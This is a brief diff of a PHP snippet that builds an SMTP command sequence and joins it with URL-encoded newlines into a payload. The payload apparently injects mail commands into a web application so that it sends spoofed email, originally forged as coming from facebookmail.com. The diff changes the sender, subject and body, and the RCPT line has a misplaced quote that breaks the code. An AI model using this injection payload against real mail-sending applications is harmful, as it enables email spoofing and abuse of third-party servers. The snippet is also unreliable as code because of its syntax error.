@@ -1,11 +1,11 @@
 <?php
 	$commands = array(
 		'HELO facebookmail.com',
-		'MAIL FROM: <noreply@facebookmail.com>',
+		'MAIL FROM: <support@codefortynine.com>',
 		'RCPT To: <bug.allmight@gmail.com'>,
 		'DATA',
-		'Subject: facebook.com',
-		'you sexy',
+		'Subject: yhv.com',
+		'you ggfgfgf',
 	);
 	
 	$payload = implode('%0A', $commands);
